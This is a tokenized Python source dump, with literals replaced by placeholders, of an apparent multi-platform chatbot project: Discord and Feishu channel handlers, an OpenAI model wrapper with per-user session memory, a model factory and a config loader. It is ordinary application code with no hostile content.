"<STR_LIT>" : int ( time . time ( ) * <NUM_LIT> ) , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> res = requests . post ( url = self . base_url + '<STR_LIT>' , headers = self . _create_header ( ) , json = data ) <EOL> context [ '<STR_LIT>' ] = res . json ( ) [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> logger . info ( "<STR_LIT>" . format ( context [ '<STR_LIT>' ] ) ) <EOL> def new_chat ( self , context ) : <EOL> headers = self . _create_header ( ) <EOL> headers [ '<STR_LIT>' ] = self . acs_token <EOL> data = { <EOL> "<STR_LIT>" : context . get ( '<STR_LIT>' ) , <EOL> "<STR_LIT>" : context [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : int ( time . time ( ) * <NUM_LIT> ) , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> res = requests . post ( url = self . base_url + '<STR_LIT>' , headers = headers , json = data ) . json ( ) <EOL> if res [ '<STR_LIT>' ] != <NUM_LIT> : <EOL> logger . error ( "<STR_LIT>" , res [ '<STR_LIT>' ] ) <EOL> return False <EOL> context [ '<STR_LIT>' ] = res [ '<STR_LIT>' ] [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> context [ '<STR_LIT>' ] = res [ '<STR_LIT>' ] [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> return True <EOL> def query ( self , context , sentence_id , count ) : <EOL> headers = self . _create_header ( ) <EOL> headers [ '<STR_LIT>' ] = self . acs_token <EOL> data = { <EOL> "<STR_LIT>" : context [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : context [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : sentence_id , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> res = requests . post ( url = self . base_url + '<STR_LIT>' , headers = headers , json = data ) <EOL> logger . debug ( "<STR_LIT>" . format ( sentence_id , count , res . text ) ) <EOL> res = res . json ( ) <EOL> if res [ '<STR_LIT>' ] [ '<STR_LIT>' ] != '<STR_LIT>' : <EOL> context [ '<STR_LIT>' ] += res [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> if res [ '<STR_LIT>' ] [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> return <EOL> if count > <NUM_LIT> : <EOL> return <EOL> time . sleep ( <NUM_LIT> ) <EOL> if not res [ '<STR_LIT>' ] [ '<STR_LIT>' ] : <EOL> return self . query ( context , sentence_id , count + <NUM_LIT> ) <EOL> else : <EOL> return self . query ( context , sentence_id + <NUM_LIT> , count + <NUM_LIT> ) <EOL> def _create_header ( self ) : <EOL> headers = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : self . cookie <EOL> } <EOL> return headers <EOL> </s>
<s> from channel . channel import Channel <EOL> from common . log import logger <EOL> from config import conf , common_conf_val , channel_conf <EOL> import ssl <EOL> import discord <EOL> from discord . ext import commands <EOL> class DiscordChannel ( Channel ) : <EOL> def __init__ ( self ) : <EOL> config = conf ( ) <EOL> self . token = channel_conf ( '<STR_LIT>' ) . get ( '<STR_LIT>' ) <EOL> self . discord_channel_name = channel_conf ( '<STR_LIT>' ) . get ( '<STR_LIT>' ) <EOL> self . discord_channel_session = channel_conf ( '<STR_LIT>' ) . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> self . voice_enabled = channel_conf ( '<STR_LIT>' ) . get ( '<STR_LIT>' , False ) <EOL> self . cmd_clear_session = common_conf_val ( '<STR_LIT>' , [ '<STR_LIT>' ] ) [ <NUM_LIT> ] <EOL> self . sessions = [ ] <EOL> self . intents = discord . Intents . default ( ) <EOL> self . intents . message_content = True <EOL> self . intents . guilds = True <EOL> self . intents . members = True <EOL> self . intents . messages = True <EOL> self . intents . voice_states = True <EOL> context = ssl . create_default_context ( ) <EOL> context . load_verify_locations ( common_conf_val ( '<STR_LIT>' ) ) <EOL> self . bot = commands . Bot ( command_prefix = '<STR_LIT>' , intents = self . intents , ssl = context ) <EOL> self . bot . add_listener ( self . on_ready ) <EOL> logger . debug ( '<STR_LIT>' , self . cmd_clear_session ) <EOL> def startup ( self ) : <EOL> self . bot . add_listener ( self . on_message ) <EOL> self . bot . add_listener ( self . on_guild_channel_delete ) <EOL> self . bot . add_listener ( self . on_guild_channel_create ) <EOL> self . bot . add_listener ( self . on_private_channel_delete ) <EOL> self . bot . add_listener ( self . on_private_channel_create ) <EOL> self . bot . add_listener ( self . on_channel_delete ) <EOL> self . bot . add_listener ( self . on_channel_create ) <EOL> self . bot . add_listener ( self . on_thread_delete ) <EOL> self . bot . add_listener ( self . on_thread_create ) <EOL> self . bot . run ( self . token ) <EOL> async def on_ready ( self ) : <EOL> logger . info ( '<STR_LIT>' . format ( self . bot . user ) ) <EOL> if self . voice_enabled == False : <EOL> logger . debug ( '<STR_LIT>' ) <EOL> await self . bot . remove_cog ( "<STR_LIT>" ) <EOL> async def join ( self , ctx ) : <EOL> logger . debug ( '<STR_LIT>' , repr ( ctx ) ) <EOL> channel = ctx . author . voice . channel <EOL> await channel . connect ( ) <EOL> async def _do_on_channel_delete ( self , channel ) : <EOL> if not self . discord_channel_name or channel . name != self . discord_channel_name : <EOL> logger . debug ( '<STR_LIT>' , channel . name ) <EOL> return <EOL> for name in self . sessions : <EOL> try : <EOL> response = self . send_text ( name , self . cmd_clear_session ) <EOL> logger . debug ( '<STR_LIT>' , channel . name , response ) <EOL> except Exception as e : <EOL> logger . warn ( '<STR_LIT>' , name ) <EOL> self . sessions . clear ( ) <EOL> async def on_guild_channel_delete ( self , channel ) : <EOL> logger . debug ( '<STR_LIT>' , repr ( channel ) ) <EOL> await self . _do_on_channel_delete ( channel ) <EOL> async def on_guild_channel_create ( self , channel ) : <EOL> logger . debug ( '<STR_LIT>' , repr ( channel ) ) <EOL> async def on_private_channel_delete ( self , channel ) : <EOL> logger . debug ( '<STR_LIT>' , repr ( channel ) ) <EOL> await self . _do_on_channel_delete ( channel ) <EOL> async def on_private_channel_create ( self , channel ) : <EOL> logger . debug ( '<STR_LIT>' , repr ( channel ) ) <EOL> async def on_channel_delete ( self , channel ) : <EOL> logger . debug ( '<STR_LIT>' , repr ( channel ) ) <EOL> async def on_channel_create ( self , channel ) : <EOL> logger . debug ( '<STR_LIT>' , repr ( channel ) ) <EOL> async def on_thread_delete ( self , thread ) : <EOL> print ( '<STR_LIT>' , thread ) <EOL> if self . discord_channel_session != '<STR_LIT>' or thread . parent . name != self . discord_channel_name : <EOL> logger . debug ( '<STR_LIT>' , thread . id ) <EOL> return <EOL> try : <EOL> response = self . send_text ( thread . id , self . cmd_clear_session ) <EOL> if thread . id in self . sessions : <EOL> self . sessions . remove ( thread . id ) <EOL> logger . debug ( '<STR_LIT>' , thread . id , response ) <EOL> except Exception as e : <EOL> logger . warn ( '<STR_LIT>' , thread . id ) <EOL> raise e <EOL> async def on_thread_create ( self , thread ) : <EOL> logger . debug ( '<STR_LIT>' , thread . id ) <EOL> if self . discord_channel_session != '<STR_LIT>' or thread . parent . name != self . discord_channel_name : <EOL> logger . debug ( '<STR_LIT>' , repr ( thread ) ) <EOL> return <EOL> self . sessions . append ( thread . id ) <EOL> async def on_message ( self , message ) : <EOL> await self . bot . wait_until_ready ( ) <EOL> if not self . check_message ( message ) : <EOL> return <EOL> prompt = message . content . strip ( ) ; <EOL> logger . debug ( '<STR_LIT>' , message . author ) <EOL> logger . debug ( '<STR_LIT>' , prompt ) <EOL> session_id = message . author <EOL> if self . discord_channel_session == '<STR_LIT>' and isinstance ( message . channel , discord . Thread ) : <EOL> logger . debug ( '<STR_LIT>' , message . channel . id ) <EOL> session_id = message . channel . id <EOL> await message . channel . send ( '<STR_LIT>' ) <EOL> response = response = self . send_text ( session_id , prompt ) <EOL> await message . channel . send ( response ) <EOL> def check_message ( self , message ) : <EOL> if message . author == self . bot . user : <EOL> return False <EOL> prompt = message . content . strip ( ) ; <EOL> if not prompt : <EOL> logger . debug ( '<STR_LIT>' , message . author ) <EOL> return False <EOL> if self . discord_channel_name : <EOL> if isinstance ( message . channel , discord . Thread ) and message . channel . parent . name == self . discord_channel_name : <EOL> return True <EOL> if not isinstance ( message . channel , discord . Thread ) and self . discord_channel_session != '<STR_LIT>' and message . channel . name == self . discord_channel_name : <EOL> return True <EOL> logger . debug ( "<STR_LIT>" ) <EOL> return False <EOL> else : <EOL> return True <EOL> def send_text ( self , id , content ) : <EOL> context = dict ( ) <EOL> context [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> context [ '<STR_LIT>' ] = id <EOL> context [ '<STR_LIT>' ] = content <EOL> return super ( ) . build_reply_content ( content , context ) <EOL> </s>
<s> from common import const <EOL> def create_bot ( model_type ) : <EOL> if model_type == const . OPEN_AI : <EOL> from model . openai . open_ai_model import OpenAIModel <EOL> return OpenAIModel ( ) <EOL> elif model_type == const . CHATGPT : <EOL> from model . openai . chatgpt_model import ChatGPTModel <EOL> return ChatGPTModel ( ) <EOL> elif model_type == const . BAIDU : <EOL> from model . baidu . yiyan_model import YiyanModel <EOL> return YiyanModel ( ) <EOL> elif model_type == const . BING : <EOL> from model . bing . new_bing_model import BingModel <EOL> return BingModel ( ) <EOL> elif model_type == const . BARD : <EOL> from model . google . bard_model import BardModel <EOL> return BardModel ( ) <EOL> raise RuntimeError <EOL> </s>
<s> from model import model_factory <EOL> import config <EOL> from plugins . event import Event , EventContext <EOL> from plugins . plugin_manager import PluginManager <EOL> class Bridge ( object ) : <EOL> def __init__ ( self ) : <EOL> pass <EOL> def fetch_reply_content ( self , query , context ) : <EOL> econtext = PluginManager ( ) . emit_event ( EventContext ( <EOL> Event . ON_BRIDGE_HANDLE_CONTEXT , { '<STR_LIT>' : query , '<STR_LIT>' : context } ) ) <EOL> type = econtext [ '<STR_LIT>' ] . get ( '<STR_LIT>' ) or config . conf ( ) . get ( "<STR_LIT>" ) . get ( "<STR_LIT>" ) <EOL> query = econtext . econtext . get ( "<STR_LIT>" , None ) <EOL> reply = econtext . econtext . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if not econtext . is_pass ( ) and query : <EOL> return model_factory . create_bot ( type ) . reply ( query , context ) <EOL> else : <EOL> return reply <EOL> async def fetch_reply_stream ( self , query , context ) : <EOL> econtext = PluginManager ( ) . emit_event ( EventContext ( <EOL> Event . ON_BRIDGE_HANDLE_CONTEXT , { '<STR_LIT>' : query , '<STR_LIT>' : context } ) ) <EOL> type = econtext [ '<STR_LIT>' ] . get ( '<STR_LIT>' ) or config . conf ( ) . get ( "<STR_LIT>" ) . get ( "<STR_LIT>" ) <EOL> query = econtext . econtext . get ( "<STR_LIT>" , None ) <EOL> reply = econtext . econtext . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> bot = model_factory . create_bot ( type ) <EOL> if not econtext . is_pass ( ) and query : <EOL> async for final , response in bot . reply_text_stream ( query , context ) : <EOL> yield final , response <EOL> else : <EOL> yield True , reply <EOL> </s>
<s> import time <EOL> from threading import Lock <EOL> class Store ( object ) : <EOL> def get ( self , key ) : <EOL> return False , '<STR_LIT>' <EOL> def set ( self , key , value , expire ) : <EOL> pass <EOL> class ExpireValue ( object ) : <EOL> def __init__ ( self , value , expireTime ) : <EOL> self . value = value <EOL> self . expireTime = expireTime <EOL> class MemoryStore ( Store ) : <EOL> def __init__ ( self ) : <EOL> self . data = { } <EOL> self . mutex = Lock ( ) <EOL> def get ( self , key ) : <EOL> self . mutex . acquire ( ) <EOL> try : <EOL> val = self . data . get ( key ) <EOL> if val is None : <EOL> return False , "<STR_LIT>" <EOL> else : <EOL> if val . expireTime == - <NUM_LIT> : <EOL> return True , val . value <EOL> elif val . expireTime < int ( time . time ( ) ) : <EOL> self . data . pop ( key ) <EOL> return False , "<STR_LIT>" <EOL> else : <EOL> return True , val . value <EOL> finally : <EOL> self . mutex . release ( ) <EOL> def set ( self , key , value , expire = None ) : <EOL> self . mutex . acquire ( ) <EOL> try : <EOL> self . data [ key ] = ExpireValue ( <EOL> value , expire == None and - <NUM_LIT> or int ( time . time ( ) ) + expire ) <EOL> finally : <EOL> self . mutex . release ( ) <EOL> </s>
<s> import json <EOL> import hmac <EOL> import hashlib <EOL> import base64 <EOL> import time <EOL> import requests <EOL> from urllib . parse import quote_plus <EOL> from common import log <EOL> from flask import Flask , request , render_template , make_response <EOL> from common import const <EOL> from common import functions <EOL> from config import channel_conf <EOL> from config import channel_conf_val <EOL> from channel . channel import Channel <EOL> from urllib import request as url_request <EOL> from channel . feishu . store import MemoryStore <EOL> class FeiShuChannel ( Channel ) : <EOL> def __init__ ( self ) : <EOL> self . app_id = channel_conf ( <EOL> const . FEISHU ) . get ( '<STR_LIT>' ) <EOL> self . app_secret = channel_conf ( <EOL> const . FEISHU ) . get ( '<STR_LIT>' ) <EOL> self . verification_token = channel_conf ( <EOL> const . FEISHU ) . get ( '<STR_LIT>' ) <EOL> log . info ( "<STR_LIT>" . format ( <EOL> self . app_id , self . app_secret , self . verification_token ) ) <EOL> self . memory_store = MemoryStore ( ) <EOL> def startup ( self ) : <EOL> http_app . run ( host = '<STR_LIT>' , port = channel_conf ( <EOL> const . FEISHU ) . get ( '<STR_LIT>' ) ) <EOL> def get_tenant_access_token ( self ) : <EOL> url = "<STR_LIT>" <EOL> headers = { <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> req_body = { <EOL> "<STR_LIT>" : self . app_id , <EOL> "<STR_LIT>" : self . app_secret <EOL> } <EOL> data = bytes ( json . dumps ( req_body ) , encoding = '<STR_LIT>' ) <EOL> req = url_request . Request ( url = url , data = data , <EOL> headers = headers , method = '<STR_LIT>' ) <EOL> try : <EOL> response = url_request . urlopen ( req ) <EOL> except Exception as e : <EOL> print ( e . read ( ) . decode ( ) ) <EOL> return "<STR_LIT>" <EOL> rsp_body = response . read ( ) . decode ( '<STR_LIT>' ) <EOL> rsp_dict = json . loads ( rsp_body ) <EOL> code = rsp_dict . get ( "<STR_LIT>" , - <NUM_LIT> ) <EOL> if code != <NUM_LIT> : <EOL> print ( "<STR_LIT>" , code ) <EOL> return "<STR_LIT>" <EOL> return rsp_dict . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> def notify_feishu ( self , token , receive_type , receive_id , at_id , answer ) : <EOL> log . info ( "<STR_LIT>" , <EOL> receive_type , receive_id ) <EOL> url = "<STR_LIT>" <EOL> params = { "<STR_LIT>" : receive_type } <EOL> text = answer . lstrip ( ) <EOL> log . info ( "<STR_LIT>" , text ) <EOL> msgContent = { <EOL> "<STR_LIT>" : text , <EOL> } <EOL> req = { <EOL> "<STR_LIT>" : receive_id , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : json . dumps ( msgContent ) , <EOL> } <EOL> payload = json . dumps ( req ) <EOL> headers = { <EOL> "<STR_LIT>" : "<STR_LIT>" + token , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> response = requests . request ( <EOL> "<STR_LIT>" , url , params = params , headers = headers , data = payload <EOL> ) <EOL> log . info ( "<STR_LIT>" , response . content ) <EOL> def handle ( self , message ) : <EOL> event = message [ "<STR_LIT>" ] <EOL> msg = event [ "<STR_LIT>" ] <EOL> messageId = msg [ "<STR_LIT>" ] <EOL> chat_type = msg [ "<STR_LIT>" ] <EOL> sender_id = event [ "<STR_LIT>" ] [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> prompt = json . loads ( msg [ "<STR_LIT>" ] ) [ "<STR_LIT>" ] <EOL> prompt = prompt . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> r , v = self . memory_store . get ( messageId ) <EOL> if v : <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> self . memory_store . set ( messageId , True ) <EOL> message_type = msg [ "<STR_LIT>" ] <EOL> if message_type != "<STR_LIT>" : <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> if chat_type == "<STR_LIT>" : <EOL> mentions = msg [ "<STR_LIT>" ] <EOL> if not mentions : <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> receive_type = "<STR_LIT>" <EOL> receive_id = msg . get ( "<STR_LIT>" ) <EOL> at_id = sender_id <EOL> elif chat_type == "<STR_LIT>" : <EOL> receive_type = "<STR_LIT>" <EOL> receive_id = sender_id <EOL> at_id = None <EOL> access_token = self . get_tenant_access_token ( ) <EOL> if access_token == "<STR_LIT>" : <EOL> log . error ( "<STR_LIT>" ) <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> context = dict ( ) <EOL> img_match_prefix = functions . check_prefix ( <EOL> prompt , channel_conf_val ( const . DINGTALK , '<STR_LIT>' ) ) <EOL> if img_match_prefix : <EOL> prompt = prompt . split ( img_match_prefix , <NUM_LIT> ) [ <NUM_LIT> ] . strip ( ) <EOL> context [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> context [ '<STR_LIT>' ] = str ( sender_id ) <EOL> reply = super ( ) . build_reply_content ( prompt , context ) <EOL> if img_match_prefix : <EOL> if not isinstance ( reply , list ) : <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> images = "<STR_LIT>" <EOL> for url in reply : <EOL> images += f"<STR_LIT>" <EOL> reply = images <EOL> self . notify_feishu ( access_token , receive_type , <EOL> receive_id , at_id , reply ) <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> def handle_request_url_verify ( self , post_obj ) : <EOL> challenge = post_obj . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> return { '<STR_LIT>' : challenge } <EOL> feishu = FeiShuChannel ( ) <EOL> http_app = Flask ( __name__ , ) <EOL> @ http_app . route ( "<STR_LIT>" , methods = [ '<STR_LIT>' ] ) <EOL> def chat ( ) : <EOL> log . info ( "<STR_LIT>" . format ( str ( request . data ) ) ) <EOL> obj = json . loads ( request . data ) <EOL> if not obj : <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> headers = obj . get ( "<STR_LIT>" ) <EOL> if not headers : <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> token = headers . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if token != feishu . verification_token : <EOL> log . error ( "<STR_LIT>" , token ) <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> t = obj . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if "<STR_LIT>" == t : <EOL> return feishu . handle_request_url_verify ( obj ) <EOL> elif headers . get ( "<STR_LIT>" , None ) == "<STR_LIT>" : <EOL> return feishu . handle ( obj ) <EOL> return { '<STR_LIT>' : <NUM_LIT> } <EOL> </s>
<s> from model . model import Model <EOL> from config import model_conf , common_conf_val <EOL> from common import const <EOL> from common import log <EOL> import openai <EOL> import time <EOL> user_session = dict ( ) <EOL> class OpenAIModel ( Model ) : <EOL> def __init__ ( self ) : <EOL> openai . api_key = model_conf ( const . OPEN_AI ) . get ( '<STR_LIT>' ) <EOL> api_base = model_conf ( const . OPEN_AI ) . get ( '<STR_LIT>' ) <EOL> if api_base : <EOL> openai . api_base = api_base <EOL> log . info ( "<STR_LIT>" . format ( openai . api_base ) ) <EOL> self . model = model_conf ( const . OPEN_AI ) . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> proxy = model_conf ( const . OPEN_AI ) . get ( '<STR_LIT>' ) <EOL> if proxy : <EOL> openai . proxy = proxy <EOL> def reply ( self , query , context = None ) : <EOL> if not context or not context . get ( '<STR_LIT>' ) or context . get ( '<STR_LIT>' ) == '<STR_LIT>' : <EOL> log . info ( "<STR_LIT>" . format ( query ) ) <EOL> from_user_id = context [ '<STR_LIT>' ] <EOL> clear_memory_commands = common_conf_val ( '<STR_LIT>' , [ '<STR_LIT>' ] ) <EOL> if query in clear_memory_commands : <EOL> Session . clear_session ( from_user_id ) <EOL> return '<STR_LIT>' <EOL> new_query = Session . build_session_query ( query , from_user_id ) <EOL> log . debug ( "<STR_LIT>" . format ( new_query ) ) <EOL> if context . get ( '<STR_LIT>' ) : <EOL> return self . reply_text_stream ( query , new_query , from_user_id ) <EOL> reply_content = self . reply_text ( new_query , from_user_id , <NUM_LIT> ) <EOL> log . debug ( "<STR_LIT>" . format ( new_query , from_user_id , reply_content ) ) <EOL> if reply_content and query : <EOL> Session . save_session ( query , reply_content , from_user_id ) <EOL> return reply_content <EOL> elif context . get ( '<STR_LIT>' , None ) == '<STR_LIT>' : <EOL> return self . create_img ( query , <NUM_LIT> ) <EOL> def reply_text ( self , query , user_id , retry_count = <NUM_LIT> ) : <EOL> try : <EOL> response = openai . Completion . create ( <EOL> model = self . model , <EOL> prompt = query , <EOL> temperature = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , <NUM_LIT> ) , <EOL> frequency_penalty = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , <NUM_LIT> ) , <EOL> presence_penalty = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , <NUM_LIT> ) , <EOL> stop = [ "<STR_LIT>" ] <EOL> ) <EOL> res_content = response . choices [ <NUM_LIT> ] [ '<STR_LIT>' ] . strip ( ) . replace ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> log . info ( "<STR_LIT>" . format ( res_content ) ) <EOL> return res_content <EOL> except openai . error . RateLimitError as e : <EOL> log . warn ( e ) <EOL> if retry_count < <NUM_LIT> : <EOL> time . sleep ( <NUM_LIT> ) <EOL> log . warn ( "<STR_LIT>" . format ( retry_count + <NUM_LIT> ) ) <EOL> return self . reply_text ( query , user_id , retry_count + <NUM_LIT> ) <EOL> else : <EOL> return "<STR_LIT>" <EOL> except Exception as e : <EOL> log . exception ( e ) <EOL> Session . clear_session ( user_id ) <EOL> return "<STR_LIT>" <EOL> async def reply_text_stream ( self , query , context , retry_count = <NUM_LIT> ) : <EOL> try : <EOL> user_id = context [ '<STR_LIT>' ] <EOL> new_query = Session . build_session_query ( query , user_id ) <EOL> res = openai . Completion . create ( <EOL> model = "<STR_LIT>" , <EOL> prompt = new_query , <EOL> temperature = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , <NUM_LIT> ) , <EOL> max_tokens = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , <NUM_LIT> ) , <EOL> frequency_penalty = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , <NUM_LIT> ) , <EOL> presence_penalty = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , <NUM_LIT> ) , <EOL> stream = True <EOL> ) <EOL> full_response = "<STR_LIT>" <EOL> for chunk in res : <EOL> log . debug ( chunk ) <EOL> if ( chunk [ "<STR_LIT>" ] [ <NUM_LIT> ] [ "<STR_LIT>" ] == "<STR_LIT>" ) : <EOL> break <EOL> chunk_message = chunk [ '<STR_LIT>' ] [ <NUM_LIT> ] . get ( "<STR_LIT>" ) <EOL> if ( chunk_message ) : <EOL> full_response += chunk_message <EOL> yield False , full_response <EOL> Session . save_session ( query , full_response , user_id ) <EOL> log . info ( "<STR_LIT>" , full_response ) <EOL> yield True , full_response <EOL> except openai . error . RateLimitError as e : <EOL> log . warn ( e ) <EOL> if retry_count < <NUM_LIT> : <EOL> time . sleep ( <NUM_LIT> ) <EOL> log . warn ( "<STR_LIT>" . format ( retry_count + <NUM_LIT> ) ) <EOL> yield True , self . reply_text_stream ( query , user_id , retry_count + <NUM_LIT> ) <EOL> else : <EOL> yield True , "<STR_LIT>" <EOL> except openai . error . APIConnectionError as e : <EOL> log . warn ( e ) <EOL> log . warn ( "<STR_LIT>" ) <EOL> yield True , "<STR_LIT>" <EOL> except openai . error . Timeout as e : <EOL> log . warn ( e ) <EOL> log . warn ( "<STR_LIT>" ) <EOL> yield True , "<STR_LIT>" <EOL> except Exception as e : <EOL> log . exception ( e ) <EOL> Session . clear_session ( user_id ) <EOL> yield True , "<STR_LIT>" <EOL> def _process_reply_stream ( <EOL> self , <EOL> query : str , <EOL> reply : dict , <EOL> user_id : str <EOL> ) -> str : <EOL> full_response = "<STR_LIT>" <EOL> for response in reply : <EOL> if response . get ( "<STR_LIT>" ) is None or len ( response [ "<STR_LIT>" ] ) == <NUM_LIT> : <EOL> raise Exception ( "<STR_LIT>" ) <EOL> if response [ "<STR_LIT>" ] [ <NUM_LIT> ] . get ( "<STR_LIT>" ) is not None : <EOL> break <EOL> if response [ "<STR_LIT>" ] [ <NUM_LIT> ] . get ( "<STR_LIT>" ) is None : <EOL> raise Exception ( "<STR_LIT>" ) <EOL> if response [ "<STR_LIT>" ] [ <NUM_LIT> ] [ "<STR_LIT>" ] == "<STR_LIT>" : <EOL> break <EOL> yield response [ "<STR_LIT>" ] [ <NUM_LIT> ] [ "<STR_LIT>" ] <EOL> full_response += response [ "<STR_LIT>" ] [ <NUM_LIT> ] [ "<STR_LIT>" ] <EOL> if query and full_response : <EOL> Session . save_session ( query , full_response , user_id ) <EOL> def create_img ( self , query , retry_count = <NUM_LIT> ) : <EOL> try : <EOL> log . info ( "<STR_LIT>" . format ( query ) ) <EOL> response = openai . Image . create ( <EOL> prompt = query , <EOL> n = <NUM_LIT> , <EOL> size = "<STR_LIT>" <EOL> ) <EOL> image_url = response [ '<STR_LIT>' ] [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> log . info ( "<STR_LIT>" . format ( image_url ) ) <EOL> return [ image_url ] <EOL> except openai . error . RateLimitError as e : <EOL> log . warn ( e ) <EOL> if retry_count < <NUM_LIT> : <EOL> time . sleep ( <NUM_LIT> ) <EOL> log . warn ( "<STR_LIT>" . format ( retry_count + <NUM_LIT> ) ) <EOL> return self . reply_text ( query , retry_count + <NUM_LIT> ) <EOL> else : <EOL> return "<STR_LIT>" <EOL> except Exception as e : <EOL> log . exception ( e ) <EOL> return None <EOL> class Session ( object ) : <EOL> @ staticmethod <EOL> def build_session_query ( query , user_id ) : <EOL> prompt = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if prompt : <EOL> prompt += "<STR_LIT>" <EOL> session = user_session . get ( user_id , None ) <EOL> if session : <EOL> for conversation in session : <EOL> prompt += "<STR_LIT>" + conversation [ "<STR_LIT>" ] + "<STR_LIT>" + conversation [ "<STR_LIT>" ] + "<STR_LIT>" <EOL> prompt += "<STR_LIT>" + query + "<STR_LIT>" <EOL> return prompt <EOL> else : <EOL> return prompt + "<STR_LIT>" + query + "<STR_LIT>" <EOL> @ staticmethod <EOL> def save_session ( query , answer , user_id ) : <EOL> max_tokens = model_conf ( const . OPEN_AI ) . get ( "<STR_LIT>" ) <EOL> if not max_tokens : <EOL> max_tokens = <NUM_LIT> <EOL> conversation = dict ( ) <EOL> conversation [ "<STR_LIT>" ] = query <EOL> conversation [ "<STR_LIT>" ] = answer <EOL> session = user_session . get ( user_id ) <EOL> log . debug ( conversation ) <EOL> log . debug ( session ) <EOL> if session : <EOL> session . append ( conversation ) <EOL> else : <EOL> queue = list ( ) <EOL> queue . append ( conversation ) <EOL> user_session [ user_id ] = queue <EOL> Session . discard_exceed_conversation ( user_session [ user_id ] , max_tokens ) <EOL> @ staticmethod <EOL> def discard_exceed_conversation ( session , max_tokens ) : <EOL> count = <NUM_LIT> <EOL> count_list = list ( ) <EOL> for i in range ( len ( session ) - <NUM_LIT> , - <NUM_LIT> , - <NUM_LIT> ) : <EOL> history_conv = session [ i ] <EOL> count += len ( history_conv [ "<STR_LIT>" ] ) + len ( history_conv [ "<STR_LIT>" ] ) <EOL> count_list . append ( count ) <EOL> for c in count_list : <EOL> if c > max_tokens : <EOL> session . pop ( <NUM_LIT> ) <EOL> @ staticmethod <EOL> def clear_session ( user_id ) : <EOL> user_session [ user_id ] = [ ] <EOL> </s>
<s> import json <EOL> import os <EOL> config = { } <EOL> def load_config ( config_path = "<STR_LIT>" ) : <EOL> global config <EOL> if not os . path . exists ( config_path ) : <EOL> raise Exception ( '<STR_LIT>' ) <EOL> config_str = read_file ( config_path ) <EOL> config = json . loads ( config_str ) <EOL> print ( "<STR_LIT>" ) <EOL> return config <EOL> def get_root ( ) : <EOL> return os . path . dirname ( os . path . abspath ( __file__ ) ) <EOL> def read_file ( path ) : <EOL> with open ( path , mode = '<STR_LIT>' , encoding = '<STR_LIT>' ) as f : <EOL> return f . read ( ) <EOL> def conf ( ) : <EOL> return config <EOL> def model_conf ( model_type ) : <EOL> return config . get ( '<STR_LIT>' ) . get ( model_type ) <EOL> def model_conf_val ( model_type , key ) : <EOL> val = config . get ( '<STR_LIT>' ) . get ( model_type ) . get ( key ) <EOL> if not val : <EOL> return config . get ( '<STR_LIT>' ) . get ( key ) <EOL> return val <EOL> def channel_conf ( channel_type ) : <EOL> return config . get ( '<STR_LIT>' ) . get ( channel_type ) <EOL> def channel_conf_val ( channel_type , key , default = None ) : <EOL> val = config . get ( '<STR_LIT>' ) . get ( channel_type ) . get ( key ) <EOL> if not val : <EOL> return config . get ( '<STR_LIT>' ) . get ( key , default ) <EOL> return val <EOL> def common_conf_val ( key , default = None ) : <EOL> if not config . get ( '<STR_LIT>' ) : <EOL> return default <EOL> return config . get ( '<STR_LIT>' ) . get ( key , default ) <EOL> </s>
